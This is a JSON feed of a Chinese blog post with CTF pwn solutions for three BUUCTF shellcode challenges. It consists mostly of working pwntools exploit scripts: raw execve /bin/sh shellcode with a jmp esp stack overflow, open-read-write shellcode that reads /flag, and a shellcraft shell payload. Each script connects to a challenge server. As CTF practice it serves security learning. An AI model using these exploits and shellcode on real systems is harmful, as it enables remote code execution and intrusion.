{
    "version": "https://jsonfeed.org/version/1",
    "title": "-NIYAH- • All posts by \"shellcode\" tag",
    "description": "Niyah",
    "home_page_url": "http://niyah.cn",
    "items": [
        {
            "id": "http://niyah.cn/CTF/shellcode%E4%BE%8B%E9%A2%98/",
            "url": "http://niyah.cn/CTF/shellcode%E4%BE%8B%E9%A2%98/",
            "title": "shellcode例题",
            "date_published": "2021-03-28T06:10:27.000Z",
            "content_html": "<p>一直不是很会的一个点</p>\n<a id=\"more\"></a>\n<h2 id=\"b0verfl0w\"><a class=\"markdownIt-Anchor\" href=\"#b0verfl0w\">#</a> b0verfl0w</h2>\n<p>自己构造一下汇编指令</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span>\np<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"29624\"</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0\\x0b\\xcd\\x80\"</span>\n\ngad_get <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\nsub esp,0x28;\ncall esp\n'''</span>\ngad_get <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>gad_get<span class=\"token punctuation\">)</span>\njmp_esp<span class=\"token operator\">=</span><span class=\"token number\">0x08048504</span>\npayload<span class=\"token operator\">=</span>shellcode<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"bbbb\"</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>jmp_esp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>gad_get\n\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"your name?\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"orw\"><a class=\"markdownIt-Anchor\" href=\"#orw\">#</a> orw</h2>\n<p>open read write shellcode</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node3.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25346</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/flag'</span><span class=\"token punctuation\">)</span>\nshellcode <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\nshellcode <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'shellcode:'</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"picoctf_2018_shellcode\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_shellcode\">#</a> PicoCTF_2018_shellcode</h2>\n<p>程序自己直接会执行输入的 shellcode</p>\n<center><img src=\"/CTF/shellcode%E4%BE%8B%E9%A2%98/ez.png\"></center>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\np<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node3.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28126</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "BUUCTF",
                "shellcode"
            ]
        }
    ]
}